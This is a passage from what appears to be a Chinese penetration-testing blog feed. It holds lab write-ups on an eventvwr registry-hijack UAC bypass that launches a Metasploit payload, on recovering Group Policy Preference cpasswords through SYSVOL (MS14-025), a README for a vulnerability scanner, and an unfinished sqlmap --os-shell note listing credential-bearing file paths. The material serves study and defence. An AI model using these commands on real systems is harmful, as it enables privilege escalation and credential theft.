<span class="hljs-params">HKEY_CLASSES_ROOT</span><br></code></pre></td></tr></table></figure><p>在Win7 中 我这里的 <code>regedit</code> 中的键值只到 <code>HKCU\Software\Classes\</code> 这层目录，所以我新增了后面的表项，并把值设为 <code>C:\Windows\System32\calc.exe</code>。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085030.png" alt="image-20210119163817241"></p><p>再重新启动<code>eventvwr.exe</code>，成功弹出计算器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085036.png" alt="image-20210119163926939"></p><p>并且使用Process Monitor 查看权限，也是<code>high</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085040.png" alt="image-20210119164604806"></p><p>而正常启动计算器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085048.png" alt="image-20210119164803238"></p><p>实验成功，成功绕过 UAC。</p><h4 id="4-2-实战"><a href="#4-2-实战" class="headerlink" title="4.2 实战"></a>4.2 实战</h4><p>修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为msf生成的exe，之后运行<code>eventvwr.exe</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085055.png" alt="image-20210119165643571"></p><p>一句话修改注册表，将<code>d:\1.exe</code>改为msf的exe地址，复制到命令行执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add <span class="hljs-string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d d:\1.exe /f   <span class="hljs-comment">#1.exe为msf马</span><br></code></pre></td></tr></table></figure><p>如果直接执行shell.exe，反弹回来的会话不能通过getsystem直接提权，因为会被UAC拦截</p><p><img src="images/image-20210119171432120.png" alt="image-20210119171432120"></p><p>劫持注册表后，再次执行eventvwr，程序就会去查找劫持的注册表地址，然后以自动提权之后的管理员权限加载shell.exe，此时反弹回来的会话可通过getsystem直接提权</p><p><img src="images/image-20210119170019046.png" alt="image-20210119170019046"></p><p>最后记得清除注册表项</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg delete &quot;HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand&quot;<br></code></pre></td></tr></table></figure><p>需要注意的是，执行eventvwr命令时才会去注册表查找mmc.exe的路径，如果执行的是mmc.exe eventvwr.msc，直接加载mmc.exe，是不会去查询注册表的。</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>组策略提权实验</title>
    <link href="/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/"/>
    <url>/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>管理员在域中新建一个组策略后,操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p></blockquote><h2 id="1-组策略基本介绍"><a href="#1-组策略基本介绍" class="headerlink" title="1. 组策略基本介绍"></a>1. 组策略基本介绍</h2><p>组策略可以控制用户帐户和计算机帐户的工作环境。它提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。有本机组策略和域的组策略。本机组策略用于计算机管理员统一管理本机以及所有用户，域内的组策略用于域管统一管理域内的所有计算机以及域用户。 在本文中侧重点讲的是域内的组策略，借机学一下域环境搭建</p><h2 id="2-SYSVOL-漏洞-MS14-025"><a href="#2-SYSVOL-漏洞-MS14-025" class="headerlink" title="2. SYSVOL 漏洞(MS14-025)"></a>2. SYSVOL 漏洞(MS14-025)</h2><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL 文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSvOL 目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies 目录中。</p><p>在一般的域环境中,所有机器都是脚本化批量部署的,数据量通常很大。为了方便地对所有的机器进行操作,网络管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加人域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。但是当通过组策略统一修改密码，虽然密码强度会有所提高，这就造成了所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码,就相当于获得了整个域中所有机器的本地管理员密码。</p><p>在域中，存在一个默认的共享路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\<br></code></pre></td></tr></table></figure><p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等。</p><p>例如，测试主机所在域为test.yhy，可访问共享文件夹<code>\\test.yhy\SYSVOL\test.yhy</code>，如下图：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084350.png" alt="image-20210116111851931"></p><p>在早期的版本，某些组策略首选项可以存储加密过的密码，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了私钥，地址： <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx%E3%80%82">https://msdn.microsoft.com/en-us/library/cc422924.aspx。</a></p><p>![image-20210116111342068](/Users/yhy/Library/Application Support/typora-user-images/image-20210116111342068.png)</p><p>如下几个组策略首选项文件中会存在可选的密码cpassword 属性:</p><ul><li><p>  Groups\Groupsx.xml</p></li><li><p>  Services\Services.xml</p></li><li><p>  ScheduledTasks\ScheduledTasks.xml</p></li><li><p>  Printers\Printers.xml</p></li><li><p>  Drives\Drives.xml</p></li><li><p>  DataSources\DataSources.xml</p></li></ul><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-域环境搭建"><a href="#3-1-域环境搭建" class="headerlink" title="3.1 域环境搭建"></a>3.1 域环境搭建</h3><h4 id="3-1-1-环境要求"><a href="#3-1-1-环境要求" class="headerlink" title="3.1.1 环境要求"></a>3.1.1 环境要求</h4><p>环境：Windows Server 2008R2 </p><p>网络：NAT模式</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084407.png" alt="image-20210116112955314"></p><p>更改管理员Administrator 密码为强密码，例如：test.yhy@123</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084412.png" alt="image-20210116114025566"></p><h4 id="3-1-2-添加域"><a href="#3-1-2-添加域" class="headerlink" title="3.1.2 添加域"></a>3.1.2 添加域</h4><p>点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084418.png" alt="image-20210116112445745"></p><p>选中 Active Directory 域服务</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084422.png" alt="image-20210116113323735"></p><p>一直下一步，安装即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084429.png" alt="image-20210116113443897"></p><p>关闭后，打开“服务器管理器”，找到Active Directory安装向导</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084433.png" alt="image-20210116113523528"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084437.png" alt="image-20210116113639168"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084446.png" alt="image-20210116114315069"></p><p>因为前面没配置静态IP（前面应该配置为静态IP的，不过这个环境无所谓了），这里选择是：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084451.png" alt="image-20210116114528206"> </p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084518.png" alt="image-20210116114630800"></p><p>点击是，下一步，设置密码：test.yhy@123</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084525.png" alt="image-20210116114714649"></p><p>一直下一步，等待安装</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084531.png" alt="image-20210116114816453"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084537.png" alt="image-20210116114855068"></p><p>完成，重启。</p><p>测试一下：<code>net user /domain</code>, ok</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084547.png" alt="image-20210116115925975"></p><h4 id="3-1-3安装FTP服务"><a href="#3-1-3安装FTP服务" class="headerlink" title="3.1.3安装FTP服务"></a>3.1.3安装FTP服务</h4><p>虚拟机不知道为啥装不上VMware Tools，没办法拖文件，这里打开FTP服务，使用FTP上传文件。</p><p>还是点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084554.png" alt="image-20210116120244713"></p><p>选择Web服务（IIS），下一步，最下边选择FTP服务器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084558.png" alt="image-20210116120911584"></p><p>一直下一步，安装</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084604.png" alt="image-20210116120952490"></p><p>完成后，点击开始按钮，所有程序 —&gt; 管理工具 —&gt; Internet 信息服务(IIS)管理器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084609.png" alt="image-20210116120424350"></p><p>右键添加FTP站点</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084618.png" alt="image-20210116122419671"></p><p>站点名称随意，物理路径，这里选择了C盘下新建文件夹，</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084624.png" alt="image-20210116123005662"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084629.png" alt="image-20210116123140690"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084634.png" alt="image-20210116123215490"></p><p>然后完成即可， 这时候使用FTP连接工具即可，连不上通过控制面板，关闭防火墙即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084638.png" alt="image-20210116123531384"></p><h3 id="3-2-创建组策略，批量修改域中机器的本地管理员密码"><a href="#3-2-创建组策略，批量修改域中机器的本地管理员密码" class="headerlink" title="3.2 创建组策略，批量修改域中机器的本地管理员密码"></a>3.2 创建组策略，批量修改域中机器的本地管理员密码</h3><h4 id="3-2-1创建组策略"><a href="#3-2-1创建组策略" class="headerlink" title="3.2.1创建组策略"></a>3.2.1创建组策略</h4><p>Win + R 打开运行 ，输入gpmc.msc ，进入组策略管理。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084644.png" alt="image-20210116124142601">         右击<code>组策略</code> —&gt; <code>新建</code>:</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084649.png" alt="image-20210116124834370"></p><p>右击<code>test</code>(刚刚创建好的组策略对象)–&gt;<code>编辑</code>,来到如下位置：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084653.png" alt="image-20210116124949983"></p><p>右击<code>本地用户和组</code>–&gt;<code>新建</code>–&gt;<code>本地用户</code>：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084658.png" alt="image-20210116125418016"></p><p>其中设置的密码为<code>hackyhy.123</code></p><p>回到组策略管理，设置组策略的对象，添加<code>Domain Computers</code>到组策略组中：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084712.png" alt="image-20210116125705664"></p><p>查看组策略对象<code>test</code>的详细信息：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084718.png" alt="image-20210116125821832"></p><p>至此，组策略配置完成，域内主机重新登录。</p><blockquote><p>  管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p></blockquote><p>根据test的ID 去访问 <code>\\test.yhy\SYSVOL\test.yhy\Policies</code> 或者本地的<code>C:\Windows\SYSVOL\domain\Policies</code>相对应的策略。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084723.png" alt="image-20210116130016932"></p><p>打开，访问<code>\Machine\Preferences\Groups</code>，找到文件<code>Groups.xml</code>，</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084729.png" alt="image-20210116130711551"></p><p>其中的关注点为<code>cpassword</code>: fjomcrwPmyEFuKDFM1WGGDUe8Ap1iGL/RsEuyDABYBI</p><h4 id="3-2-2-漏洞利用"><a href="#3-2-2-漏洞利用" class="headerlink" title="3.2.2 漏洞利用"></a>3.2.2 漏洞利用</h4><p>介绍两种简单的利用方式</p><ul><li>  Kali 下，将cpassword 字段复制到kali中，使用gpp-decrypt 进行破解</li></ul><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084757.png" alt="img"></p><ul><li><p>msf 模块</p><p>  使用msf后渗透模块</p><p>  <code>run post/windows/gather/credentials/gpp</code></p><p>  当拿到目标的session后（这里直接将msf生成的马，通过ftp上传，并执行）</p></li></ul><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084804.png" alt="image-20210116134115737"></p><h2 id="4-组策略首选项提权的防御措施"><a href="#4-组策略首选项提权的防御措施" class="headerlink" title="4. 组策略首选项提权的防御措施"></a>4. 组策略首选项提权的防御措施</h2><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p><p>此外，针对Everyone访问权限进行设置，具体如下：</p><ol><li> 设置共享文件夹SYSVOL的访问权限</li><li> 将包含组策略密码的 XML 文件从 SYSVOL 目录中删除s</li><li> 不要把密码放在所有域用户都有权访问的文件中 </li><li> 如果需要更改域中机器的本地管理员密码，建议使用LAPS</li></ol>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SScan  一款src捡洞扫描器</title>
    <link href="/2021/01/11/SScan/"/>
    <url>/2021/01/11/SScan/</url>
    
    <content type="html"><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p><p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p><h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p><p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p><h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 SScan.py version                                查看版本<br>python3 SScan.py --<span class="hljs-built_in">help</span>                                 获取帮助<br>python3 SScan.py --host example.com run                 单个目标<br>python3 SScan.py --file domains.txt run                 读取一个.txt文件<br>python3 SScan.py --dire /Users/yhy/Desktop/<span class="hljs-built_in">dirs</span>/ run    读取目录下的所有.txt<br>python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，<br>                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP<br>python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run<br>                    只使用指定脚本 <br><br>您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务<br><br>其它参数：<br>    --t             扫描线程数, 默认10。<br>    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True<br>    --crawl         爬取主页的&lt;a&gt;标签， 默认为True<br>    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True<br>    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True<br>    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下<br>    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下<br>    --script_only   只使用脚本进行扫描，不使用规则<br>    --noscripts     不使用脚本扫描<br>    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py <br></code></pre></td></tr></table></figure><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li><p><input checked="" disabled="" type="checkbox">  常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p></li><li><p><input checked="" disabled="" type="checkbox">  信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p></li><li><p><input checked="" disabled="" type="checkbox">  后台登录页面资产发现</p></li><li><p><input checked="" disabled="" type="checkbox">  403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p><p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p><p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p></li><li><p><input checked="" disabled="" type="checkbox">  扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p></li><li><p><input checked="" disabled="" type="checkbox">  跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p></li><li><p><input checked="" disabled="" type="checkbox">  一些常见未授权和弱口令检测，目前支持：</p><p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p><p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p></li><li><p><input checked="" disabled="" type="checkbox">  当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p></li></ul><h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul><li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li><li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li><li><input disabled="" type="checkbox"> 继续优化各模块</li></ul><h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul><li><p>black.list 规则黑名单，命中则跳过</p></li><li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p></li><li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">/WEB<span class="hljs-literal">-INF</span>/applicationContext-<span class="hljs-literal">slave</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">&#123;tag</span>=<span class="hljs-string">&quot;&lt;?xml&quot;</span>&#125; &#123;<span class="hljs-attr">status=</span><span class="hljs-number">200</span>&#125; &#123;<span class="hljs-attr">type=</span><span class="hljs-string">&quot;xml&quot;</span>&#125; &#123;root_only&#125;<br></code></pre></td></tr></table></figure><ol><li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p></li><li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p></li><li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p></li><li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p></li><li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p><p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p><p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p></li></ol></li></ul><h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib/common/scanner.py)，可使用Scanner对象的任意方法、属性。</p><p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p><p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p><p><code>self.session</code> 是HTTP连接池</p><p><code>self.http_request</code> 可发起HTTP GET请求</p><p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li><li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li><li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li><li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li><li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li><li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li></ul><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p><h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>      </p>]]></content>
    
    
    <categories>
      
      <category>GitHub工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap关于os-shell小记</title>
    <link href="/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol><li><p>拥有dba权限</p></li><li><p>网站的绝对路径</p></li><li><p>高版本的mysql需要 <code>show variables like &#39;%secure_file_priv%&#39;</code> 或者<code>select </code></p><p> <code>@@secure;</code>或者<code>show global variables like &#39;%secure%&#39;;</code>的结果符合要求，secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。这个参数只能通过修改配置文件后重启mysql修改</p><ul><li>如果该变量为空，则变量无效，这时候最容易利用</li><li>如果变量为目录的绝对路径，则服务器会将导入和导出操作限制为仅适用于该目录中的文件</li><li>如果设置为NULL，则服务器禁用导入和导出操作。</li></ul></li><li><p>当为php时，magic_quotes_gpc为off，php主动转义的功能关闭**</p></li></ol><p>当执行 –os-shell时，这个时候sqlmap主要做了三件事情：</p><ol><li>进行目标的一个基础信息的探测。</li><li>上传shell到目标web网站上（sqlmap会自动生成两个文件，一个用于命令执行，一个用于上传文件）</li><li>退出时删除shell。</li></ol><h3 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><ol><li><p>通过网站报错信息查看绝对路径</p></li><li><p>通过搜索引擎获取</p> <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">google语法：site:<span class="hljs-keyword">baidu.com </span>warning<br><span class="hljs-symbol">site:</span><span class="hljs-keyword">baidu.com </span> <span class="hljs-string">&quot;fatal error&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>配置文件获取路径<br> 如果注入点有文件读取权限，就可以通过load_file函数读取配置文件，再从中寻找路径信息。</p></li></ol><p>  Sqlmap 下可以使用–sql-shell 获取一个sql命令执行窗口，使用load_file(‘文件名’)读取文件</p><p>  也可以使用 –file-read=文件名 ，读取文件</p><p>sqlmap -u ‘url’ –batch –file-read=/etc/httpd/conf/httpd.conf</p><ul><li><p><strong>win 下常见的敏感文件</strong></p><p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">常用的绝对路径收集</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c:/boot.ini //查看系统版本 <br>c:/windows/php.ini //php配置信息 <br>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 <br>c:/winnt/php.ini <br>c:/winnt/my.ini <br>c:<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\d</span>ata<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\u</span>ser.MYD //存储了mysql.user表中的数据库连接密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\R</span>hinoSoft.com<span 